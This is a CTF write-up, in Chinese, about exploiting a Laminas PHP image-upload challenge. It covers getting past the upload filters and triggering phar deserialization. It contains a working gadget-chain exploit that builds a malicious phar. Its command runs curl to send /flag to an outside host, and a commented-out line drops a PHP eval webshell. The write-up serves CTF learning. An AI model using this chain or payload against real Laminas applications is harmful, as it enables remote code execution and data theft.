题目是给了源码的：

根据官方手册:https://laminas.org.cn/的说明,该文件是作者写的路由

![image-20220322191638312](https://gitee.com/yyssllz/pic/raw/master/image-20220322191638312.png)



粗略的看了一下代码，发现只允许上传图片，但是过滤写的太明显了

![image-20220322192138547](https://gitee.com/yyssllz/pic/raw/master/image-20220322192138547.png)



这种一看就是phar反序列化绕过的过滤，那么看看触发点，给的也很明显，该imgpath是自由可控的，所以直接可以写进去

![image-20220322192207411](https://gitee.com/yyssllz/pic/raw/master/image-20220322192207411.png)

链子可以直接用这个打：https://xz.aliyun.com/t/8975#toc-7

```php
   if(in_array($base,$this->white_list)){   //白名单限制
                    $cont = file_get_contents($data["image-file"]["tmp_name"]);
                    if (preg_match("/<\?|php|HALT\_COMPILER/i", $cont )) {
                        die("Not This");
                    }
                    if($data["image-file"]["size"]<3000){
                        die("The picture size must be more than 3kb");
                    }
                    $img_path = realpath(getcwd()).'/public/img/'.md5($data["image-file"]["name"]).$base;
```

但是需要绕过，前者的绕过可以用gzip压缩进行绕过，而大小的话可以通过

```php
$phar->addFromString
```

写入没有意义的字符串来增大，因为我们要知道，phar反序列化实际上是通过篡改了stub的文件头，而phar文件的本意是压缩php文件，所以我们是可以写入无用的数据来填充的，那么稍微改一下就可以拼凑出来exp：

```php
<?php

namespace Laminas\View\Resolver{
    class TemplateMapResolver{
        protected $map = ["setBody"=>"system"];
    }
}
namespace Laminas\View\Renderer{
    class PhpRenderer{
        private $__helpers;
        function __construct(){
            $this->__helpers = new \Laminas\View\Resolver\TemplateMapResolver();
        }
    }
}


namespace Laminas\Log\Writer{
    abstract class AbstractWriter{}

    class Mail extends AbstractWriter{
//        protected $eventsToMail = ["echo PD9waHAgZXZhbCgkX1BPU1RbMF0pOw==|base64 -d >public/img/1.php"];
        //这里由于远程的设置没办法访问到文件
        protected $eventsToMail = ["curl http://ip?a=`cat /flag|base64`"];
        protected $subjectPrependText = null;
        protected $mail;
        function __construct(){
            $this->mail = new \Laminas\View\Renderer\PhpRenderer();
        }
    }
}

namespace Laminas\Log{
    class Logger{
        protected $writers;
        function __construct(){
            $this->writers = [new \Laminas\Log\Writer\Mail()];
        }
    }
}


namespace{
    $a = new \Laminas\Log\Logger();
    echo urlencode(serialize($a));
    unserialize(serialize($a));
    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = $a;
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", str_repeat("wuhuhuhuhuhw",999999)); //添加要压缩的文件
//签名自动计算
    $phar->stopBuffering();
//    echo base64_encode(serialize(new Logger()));
}



```

这样就可以生产phar了，执行如下：

![image-20220322192546588](https://gitee.com/yyssllz/pic/raw/master/image-20220322192546588.png)



上传文件：

![image-20220322192647021](https://gitee.com/yyssllz/pic/raw/master/image-20220322192647021.png)



触发即可得到flag

![image-20220322192653130](https://gitee.com/yyssllz/pic/raw/master/image-20220322192653130.png)